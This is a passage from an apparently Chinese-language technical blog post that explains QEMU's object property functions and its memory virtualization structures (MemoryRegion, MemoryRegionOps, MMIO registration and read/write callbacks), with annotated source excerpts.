class="literal">NULL</span>) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;attempt to add duplicate property &#x27;%s&#x27; to object (type &#x27;%s&#x27;)&quot;</span>,</span><br><span class="line">                   name, object_get_typename(obj));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    prop = g_malloc0(<span class="keyword">sizeof</span>(*prop));</span><br><span class="line"></span><br><span class="line">    prop-&gt;name = g_strdup(name);</span><br><span class="line">    prop-&gt;type = g_strdup(type);</span><br><span class="line"></span><br><span class="line">    prop-&gt;get = get;</span><br><span class="line">    prop-&gt;<span class="built_in">set</span> = <span class="built_in">set</span>;</span><br><span class="line">    prop-&gt;release = release;</span><br><span class="line">    prop-&gt;opaque = opaque;</span><br><span class="line"></span><br><span class="line">    g_hash_table_insert(obj-&gt;properties, prop-&gt;name, prop);</span><br><span class="line">    <span class="keyword">return</span> prop;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>object_property_add</code> 函数首先调用 <code>object_property_find</code> 来确认所插入的属性是否已经存在，确保不会添加重复的属性，接着分配一个 <code>ObjectProperty</code> 结构并使用参数进行初始化，然后调用 <code>g_hash_table_insert</code> 插入到对象的 <code>properties</code> 域中。</p>
<p>属性的查找通过 <code>object_property_find</code> 函数实现，代码如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ObjectProperty *<span class="title function_">object_class_property_find</span><span class="params">(ObjectClass *klass, <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">                                           Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ObjectProperty *prop;</span><br><span class="line">    ObjectClass *parent_klass;</span><br><span class="line"></span><br><span class="line">    parent_klass = object_class_get_parent(klass);</span><br><span class="line">    <span class="keyword">if</span> (parent_klass) &#123;</span><br><span class="line">        prop = object_class_property_find(parent_klass, name, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (prop) &#123;</span><br><span class="line">            <span class="keyword">return</span> prop;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    prop = g_hash_table_lookup(klass-&gt;properties, name);</span><br><span class="line">    <span class="keyword">if</span> (!prop) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;Property &#x27;.%s&#x27; not found&quot;</span>, name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prop;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数首先调用 <code>object_class_property_find</code> 来确认自己所属的类以及所有父类都不存在这个属性，然后在自己的 <code>properties</code> 域中查找。</p>
<p>属性的设置是通过 <code>object_property_set</code> 来完成的，其只是简单地调用 <code>ObjectProperty</code> 的 <code>set</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">object_property_set</span><span class="params">(Object *obj, Visitor *v, <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">                         Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ObjectProperty *prop = object_property_find(obj, name, errp);</span><br><span class="line">    <span class="keyword">if</span> (prop == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prop-&gt;<span class="built_in">set</span>) &#123;</span><br><span class="line">        error_setg(errp, QERR_PERMISSION_DENIED);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prop-&gt;<span class="built_in">set</span>(obj, v, name, prop-&gt;opaque, errp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>每一种属性类型都有自己的 <code>set</code> 函数，其名称为 <code>property_set_XXX</code> ，其中的 <code>XXX</code> 表示属性类型，如 bool、str、link 等。以 bool 为例，其 set 函数如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">property_set_bool</span><span class="params">(Object *obj, Visitor *v, <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">                              <span class="type">void</span> *opaque, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    BoolProperty *prop = opaque;</span><br><span class="line">    <span class="type">bool</span> value;</span><br><span class="line">    Error *local_err = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    visit_type_bool(v, name, &amp;value, &amp;local_err);</span><br><span class="line">    <span class="keyword">if</span> (local_err) &#123;</span><br><span class="line">        error_propagate(errp, local_err);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    prop-&gt;<span class="built_in">set</span>(obj, value, errp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到，其调用了具体属性（<code>BoolProperty</code>）的 <code>set</code> 函数，这是在创建这个属性的时候指定的。</p>
<h2 id="QEMU-内存虚拟化"><a href="#QEMU-内存虚拟化" class="headerlink" title="QEMU 内存虚拟化"></a>QEMU 内存虚拟化</h2><h3 id="QEMU-内存结构"><a href="#QEMU-内存结构" class="headerlink" title="QEMU 内存结构"></a>QEMU 内存结构</h3><p><code>MemoryRegion</code> 抽象了 <strong>一个地址空间中的一段范围</strong>，既可以是<strong>可读写的 RAM</strong>，也可以是<strong>由回调实现的 MMIO</strong>，还可以是<strong>I&#x2F;O 端口空间的桥接</strong>、<strong>别名（Alias）</strong>、<strong>IOMMU 入口</strong>、<strong>只读 ROM&#x2F;ROMD</strong>，或者<strong>纯容器（Container&#x2F;Root）</strong>。它们共同组成 <strong>无环图（DAG）</strong> 的内存映射视图，最终被“扁平化”成 <code>AddressSpace</code> 的映射供 CPU&#x2F;设备访问。</p>
<p>该结构体定义于 <code>include/exec/memory.h</code> 当中：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** MemoryRegion:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 表示“一段可映射的内存区域”（RAM、ROM、MMIO、别名、IOMMU 等）。</span></span><br><span class="line"><span class="comment"> * 既可作为顶层容器，也可作为某容器的子区域。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;                 <span class="comment">// QOM：继承自 Object，便于统一管理/属性/生命周期</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 下列字段尽量放在同一 cache line，减少热路径访问开销 */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;                    <span class="comment">// ROM direct 模式：ROM 区域是否允许像 RAM 一样直读（加速）</span></span><br><span class="line">    <span class="type">bool</span> ram;                          <span class="comment">// 是否为“RAM 型”区域（由 RAMBlock/host 内存支撑）</span></span><br><span class="line">    <span class="type">bool</span> subpage;                      <span class="comment">// 是否是“子页粒度”区域（小于页大小，需子页调度）</span></span><br><span class="line">    <span class="type">bool</span> readonly;                     <span class="comment">// 只读标志（仅对 RAM 区域有效；ROM 使用 romd/rom_device）</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;                  <span class="comment">// 非易失（如 NVDIMM/NVDIMM-like）</span></span><br><span class="line">    <span class="type">bool</span> rom_device;                   <span class="comment">// 设备型 ROM（可临时切换 romd_mode 的 ROM 设备窗口）</span></span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;         <span class="comment">// 是否需要在写合并(coalesced)MMIO后做 flush</span></span><br><span class="line">    <span class="type">bool</span> global_locking;               <span class="comment">// 访问该区域的回调是否在 BQL(全局锁) 保护下调用</span></span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;            <span class="comment">// 脏页跟踪掩码（KVM/软件脏页记录相关）</span></span><br><span class="line">    <span class="type">bool</span> is_iommu;                     <span class="comment">// 是否是 IOMMU 区域（对传入地址再翻译/转发）</span></span><br><span class="line">    RAMBlock *ram_block;               <span class="comment">// 若为 RAM：指向其 RAMBlock（宿主内存块）</span></span><br><span class="line">    Object *owner;                     <span class="comment">// 拥有该区域的 QOM 对象（设备/bridge/容器等）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;        <span class="comment">// 非 RAM/别名时的读写回调/vtable（MMIO 等）</span></span><br><span class="line">    <span class="type">void</span> *opaque;                      <span class="comment">// 传给 ops 的私有指针（设备私有上下文）</span></span><br><span class="line">    MemoryRegion *container;           <span class="comment">// 若作为子区域：指向其父容器（地址空间上的上级）</span></span><br><span class="line">    Int128 size;                       <span class="comment">// 区域大小（支持 &gt;64 位，使用 Int128）</span></span><br><span class="line">    hwaddr addr;                       <span class="comment">// 在 container 中的起始偏移（映射地址，不是 guest 物理绝对地址）</span></span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr);<span class="comment">// 区域销毁钩子（unrealize/清理时调用）</span></span><br><span class="line">    <span class="type">uint64_t</span> align;                    <span class="comment">// 对齐要求（常用于映射/别名边界约束）</span></span><br><span class="line">    <span class="type">bool</span> terminates;                   <span class="comment">// 是否“终止翻译”的叶子区域（有 ops/RAM 的终端，非容器）</span></span><br><span class="line">    <span class="type">bool</span> ram_device;                   <span class="comment">// 设备提供的“RAM 窗口”（设备声明为 RAM 的映射）</span></span><br><span class="line">    <span class="type">bool</span> enabled;                      <span class="comment">// 是否已启用（被添加/映射到容器且处于有效态）</span></span><br><span class="line">    <span class="type">bool</span> warning_printed;              <span class="comment">// 仅用于“保留区”告警：是否已打印过警告</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;         <span class="comment">// VGA 脏页日志引用计数（显示更新相关优化）</span></span><br><span class="line">    MemoryRegion *alias;               <span class="comment">// 若为别名：指向被别名的目标区域</span></span><br><span class="line">    hwaddr alias_offset;               <span class="comment">// 别名相对于目标区域的偏移</span></span><br><span class="line">    <span class="type">int32_t</span> priority;                  <span class="comment">// 子区域优先级（解决重叠时的匹配顺序，数值越大优先）</span></span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;      <span class="comment">// 子区域链表头（按优先级/地址有序）</span></span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;  <span class="comment">// 作为别人容器时，挂在其 subregions 上的链</span></span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;<span class="comment">// 合并写范围链表（减少 MMIO 写陷入次数）</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;                  <span class="comment">// 名称（调试/追踪/监控用）</span></span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;             <span class="comment">// ioeventfd 条目数量（KVM: guest 写寄存器触发 host 事件）</span></span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds; <span class="comment">// ioeventfd 数组（地址/掩码/FD 等描述）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>MemoryRegion</code> 的成员函数被封装在函数表 <code>MemoryRegionOps</code> 当中：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Memory region callbacks</span></span><br><span class="line"><span class="comment"> * 设备MMIO/PIO等“内存区域”的回调与约束。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionOps</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 从该区域读取。@addr 相对该 MemoryRegion 起始地址；@size 为字节数。 */</span></span><br><span class="line">    <span class="type">uint64_t</span> (*read)(<span class="type">void</span> *opaque,</span><br><span class="line">                     hwaddr addr,</span><br><span class="line">                     <span class="type">unsigned</span> size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 向该区域写入。@addr 相对该 MemoryRegion 起始地址；@size 为字节数。 */</span></span><br><span class="line">    <span class="type">void</span> (*write)(<span class="type">void</span> *opaque,</span><br><span class="line">                  hwaddr addr,</span><br><span class="line">                  <span class="type">uint64_t</span> data,</span><br><span class="line">                  <span class="type">unsigned</span> size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 携带“事务属性”的读写版本（如特权/安全域/原子性/顺序等由CPU/MMU下传）。</span></span><br><span class="line"><span class="comment">     * 返回值用 MemTxResult 告知成功/失败/拒绝等，比上面两个更通用。 */</span></span><br><span class="line">    MemTxResult (*read_with_attrs)(<span class="type">void</span> *opaque,</span><br><span class="line">                                   hwaddr addr,</span><br><span class="line">                                   <span class="type">uint64_t</span> *data,</span><br><span class="line">                                   <span class="type">unsigned</span> size,</span><br><span class="line">                                   MemTxAttrs attrs);</span><br><span class="line">    MemTxResult (*write_with_attrs)(<span class="type">void</span> *opaque,</span><br><span class="line">                                    hwaddr addr,</span><br><span class="line">                                    <span class="type">uint64_t</span> data,</span><br><span class="line">                                    <span class="type">unsigned</span> size,</span><br><span class="line">                                    MemTxAttrs attrs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设备寄存器视角的端序（DEVICE_NATIVE_ENDIAN / DEVICE_LITTLE_ENDIAN / DEVICE_BIG_ENDIAN）。</span></span><br><span class="line"><span class="comment">     * 内核据此在拆分/合并访问时取放字节，确保多字节寄存器的语义正确。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">device_endian</span> <span class="title">endianness</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* —— 面向“客机可见”的约束（违反将向客机报错/触发异常） —— */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非0：声明支持的最小/最大访问粒度（单位字节）。超出范围的访问</span></span><br><span class="line"><span class="comment">         * 属于“客机不被允许”的访问，可能触发 machine check 等客机可见异常。 */</span></span><br><span class="line">        <span class="type">unsigned</span> min_access_size;</span><br><span class="line">        <span class="type">unsigned</span> max_access_size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 是否允许非自然对齐访问（例如对4字节寄存器从未对齐地址访问）。</span></span><br><span class="line"><span class="comment">         * 为false时，不允许的未对齐访问将被报告为客机访问错误。 */</span></span><br><span class="line">        <span class="type">bool</span> unaligned;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 访问许可的回调：若存在且返回false，说明该笔访问被设备拒绝</span></span><br><span class="line"><span class="comment">         *（例如地址洞/保留位/只读窗口等），将导致客机侧的错误行为。 */</span></span><br><span class="line">        <span class="type">bool</span> (*accepts)(<span class="type">void</span> *opaque, hwaddr addr,</span><br><span class="line">                        <span class="type">unsigned</span> size, <span class="type">bool</span> is_write,</span><br><span class="line">                        MemTxAttrs attrs);</span><br><span class="line">    &#125; valid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* —— 设备实现自身的“内部约束”（违反时QEMU会帮你适配） —— */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非0：实现所能处理的最小粒度。小于该粒度的访问，内核会</span></span><br><span class="line"><span class="comment">         * “上调”为该粒度调用你的回调（读时只回填所需字节；写时通常做RMW）。 */</span></span><br><span class="line">        <span class="type">unsigned</span> min_access_size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 若非0：实现所能处理的最大粒度。大于该值的访问，内核会拆成</span></span><br><span class="line"><span class="comment">         * 多次较小访问调用你的回调。 */</span></span><br><span class="line">        <span class="type">unsigned</span> max_access_size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 若为false：实现不支持未对齐访问，内核会把未对齐访问拆解为</span></span><br><span class="line"><span class="comment">         * 若干自然对齐的小访问后再调用你的回调。 */</span></span><br><span class="line">        <span class="type">bool</span> unaligned;</span><br><span class="line">    &#125; impl;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>MemoryRegionOps</code> 中的 <code>read</code>、<code>write</code> 回调函数只有在命中 <strong>IO 型区域（MMIO&#x2F;ROM‑device&#x2F;PMIO）</strong>时才会调用，否则直接直接对宿主内存读写。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Guest CPU 访存</span><br><span class="line">    │</span><br><span class="line">    ▼</span><br><span class="line">AddressSpace（地址簿）</span><br><span class="line">    │ 查表定位</span><br><span class="line">    ├──► MemoryRegion = RAM/ROM ──► 直接读/写宿主内存</span><br><span class="line">    └──► MemoryRegion = IO(设备) ─► 调用 ops.read / ops.write（你的设备代码）</span><br></pre></td></tr></table></figure></div>

<h3 id="IO-型内存注册"><a href="#IO-型内存注册" class="headerlink" title="IO 型内存注册"></a>IO 型内存注册</h3><h4 id="memory-region-init-io"><a href="#memory-region-init-io" class="headerlink" title="memory_region_init_io"></a>memory_region_init_io</h4><p><code>memory_region_init_io()</code> <strong>初始化</strong>一个 <code>MemoryRegion</code>，并不会“挂到总线”或“映射给来宾”。真正对外可见还要交给 <code>pci_register_bar()</code> 或 <code>memory_region_add_subregion()</code> 等去“导出”。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* qemu/exec/memory.h */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">memory_region_init_io</span><span class="params">(MemoryRegion        *mr,</span></span><br><span class="line"><span class="params">                           Object              *owner,</span></span><br><span class="line"><span class="params">                           <span class="type">const</span> MemoryRegionOps *ops,</span></span><br><span class="line"><span class="params">                           <span class="type">void</span>                *opaque,</span></span><br><span class="line"><span class="params">                           <span class="type">const</span> <span class="type">char</span>          *name,</span></span><br><span class="line"><span class="params">                           <span class="type">uint64_t</span>             size)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>返回值</strong>：<code>void</code>（无返回值）</p>
<p><strong>参数含义</strong>：</p>
<ul>
<li><p><code>mr</code>：你要初始化的 <code>MemoryRegion</code> 实例（通常是设备状态结构里的一个成员）。</p>
</li>
<li><p><code>owner</code>：QOM 拥有者，一般传 <code>OBJECT(dev)</code> 或 <code>OBJECT(&amp;s-&gt;pdev.qdev)</code>，用于生命周期管理&#x2F;可视化。</p>
</li>
<li><p><code>ops</code>：回调表，定义了读写函数等属性：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionOps</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> (*read)(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size);</span><br><span class="line">    <span class="type">void</span>     (*write)(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> data, <span class="type">unsigned</span> size);</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">device_endian</span> <span class="title">endianness</span>;</span>  <span class="comment">/* DEVICE_NATIVE_ENDIAN/DEVICE_LITTLE_ENDIAN/... */</span></span><br><span class="line">    <span class="comment">/* 可选：.valid, .impl, .min_access_size, .max_access_size 等 */</span></span><br><span class="line">&#125; MemoryRegionOps;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>opaque</code>：回调里透传给你（设备实例指针，常传 <code>s</code>）。</p>
</li>
<li><p><code>name</code>：调试&#x2F;监控友好的区域名（如 <code>&quot;strng-mmio&quot;</code>）。</p>
</li>
<li><p><code>size</code>：区域大小（字节）。<strong>QEMU 会用它做边界检查</strong>，超出范围的访问不会进入你的 <code>ops</code>。</p>
</li>
</ul>
<h4 id="pci-register-bar"><a href="#pci-register-bar" class="headerlink" title="pci_register_bar"></a>pci_register_bar</h4><p>把 <code>memory</code> 绑定到设备配置空间的 BAR<code>region_num</code>；当来宾写 BAR 寄存器确定映射地址后，访问将由 QEMU 转发到 <code>ops-&gt;read/write</code>。<strong>边界由 <code>memory-&gt;size</code> 保证</strong>，越界访问不会进入回调。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hw/pci/pci.h */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pci_register_bar</span><span class="params">(PCIDevice    *dev,</span></span><br><span class="line"><span class="params">                      <span class="type">int</span>           region_num,</span></span><br><span class="line"><span class="params">                      <span class="type">uint8_t</span>       type,</span></span><br><span class="line"><span class="params">                      MemoryRegion *memory)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>返回值</strong>：<code>void</code>（无返回值）</p>
<p><strong>参数含义</strong>：</p>
<ul>
<li><p><code>dev</code>：<code>PCIDevice*</code>，你的 PCI 设备实例（通常是 <code>&amp;s-&gt;pdev</code>）。</p>
</li>
<li><p><code>region_num</code>：BAR 编号，<code>0..5</code>（普通设备最多 6 个 BAR；ROM 另算）。</p>
</li>
<li><p><code>type</code>：BAR 类型&#x2F;标志的组合：</p>
<ul>
<li><p><code>PCI_BASE_ADDRESS_SPACE_MEMORY = 0x00</code>（内存映射 MMIO）</p>
</li>
<li><p><code>PCI_BASE_ADDRESS_SPACE_IO = 0x01</code>（I&#x2F;O 端口 PMIO）</p>
</li>
<li><p>可与以下标志 OR 用（用于 memory BAR）：</p>
<ul>
<li><code>PCI_BASE_ADDRESS_MEM_TYPE_64</code>（64 位 BAR，会消耗连续两个 BAR 槽）</li>
<li><code>PCI_BASE_ADDRESS_MEM_PREFETCH</code>（可预取）</li>
</ul>
</li>
</ul>
</li>
<li><p><code>memory</code>：已经 <code>memory_region_init_io()</code> 好的 <code>MemoryRegion</code>。注册后，来宾对该 BAR 对应的地址空间访问会路由到 <code>memory</code> 的 <code>ops</code>。</p>
</li>
</ul>
<h3 id="IO-型内存读写"><a href="#IO-型内存读写" class="headerlink" title="IO 型内存读写"></a>IO 型内存读写</h3><p>下面这两个原型就是 QEMU <code>MemoryRegionOps</code> 里“IO 类型内存”（也就是设备的 MMIO&#x2F;PIO BAR）的访问回调，用来响应来 自客体 CPU 的一次总线事务（bus transaction）：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> (*read)(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size);</span><br><span class="line"><span class="type">void</span>     (*write)(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> data, <span class="type">unsigned</span> size);</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>opaque</code><br>你在 <code>memory_region_init_io(..., &amp;ops, opaque, ...)</code> 里传入的设备状态指针，一般是你的 <code>DeviceState</code>&#x2F;<code>PCIDevice</code> 的私有结构指针。回调里先把它强转回你的设备结构，然后读写寄存器&#x2F;状态。</p>
</li>
<li><p><code>addr</code>（类型 <code>hwaddr</code>）<br>访问的<strong>偏移</strong>，相对于该 <code>MemoryRegion</code> 的起始地址（也就是相对于 BAR 的起点）。不是系统物理地址。<code>hwaddr</code> 是面向“客体地址宽度”的无符号整型，足以容纳 64 位偏移。</p>
</li>
<li><p><code>size</code>（单位：字节）<br>本次访问的宽度：1、2、4、8 之一（具体允许哪些，由你的 <code>MemoryRegionOps</code> 的“可接受&#x2F;实现的访问宽度”设定决定；不支持的宽度，QEMU 会拆成更小的多次调用，或直接拒绝访问，取决于你的配置）。</p>
</li>
<li><p><code>data</code>（仅写回调）<br>要写入的值，其有效位仅在低 <code>size * 8</code> 位。你在写入设备寄存器时应据此掩码并对齐。</p>
</li>
<li><p><code>read</code> 的返回值<br>读取到的数据，用 <strong>低 <code>size * 8</code> 位</strong> 承载。不要做符号扩展。对齐&#x2F;字节序由 <code>MemoryRegionOps</code> 的 <code>endianness</code> 和访问宽度共同决定。</p>
</li>
</ul>
<blockquote>
<p>小结：一次 CPU 对设备寄存器的 load&#x2F;store → QEMU 解析后调用你的 <code>read</code>&#x2F;<code>write</code>，你依据 <code>addr/size</code> 在寄存器空间里取&#x2F;改值并返回&#x2F;完成。</p>
</blockquote>
<h3 id="内存操作函数"><a href="#内存操作函数" class="headerlink" title="内存操作函数"></a>内存操作函数</h3><h4 id="AddressSpace-通用读写"><a href="#AddressSpace-通用读写" class="headerlink" title="AddressSpace 通用读写"></a>AddressSpace 通用读写</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MemTxResult <span class="title function_">address_space_read</span><span class="params">(AddressSpace *as, hwaddr addr,</span></span><br><span class="line"><span class="params">                               MemTxAttrs attrs, <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line">MemTxResult <span class="title function_">address_space_write</span><span class="params">(AddressSpace *as, hwaddr addr,</span></span><br><span class="line"><span class="params">                                MemTxAttrs attrs, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> 